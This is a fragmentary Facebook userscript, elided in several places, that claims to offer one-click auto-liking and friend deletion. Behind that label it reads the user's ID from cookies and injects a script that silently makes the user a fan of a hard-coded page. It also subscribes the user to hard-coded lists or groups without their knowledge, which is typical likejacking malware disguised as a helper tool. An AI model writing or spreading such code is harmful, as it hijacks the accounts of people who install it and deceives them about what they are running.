// ==UserScript==
// @name        [C] Auto Like Auto Delete Friends at one click Facebook
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:487183707993318,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
...
sublist("121768797999660");
var gid = ['313800772064540'];
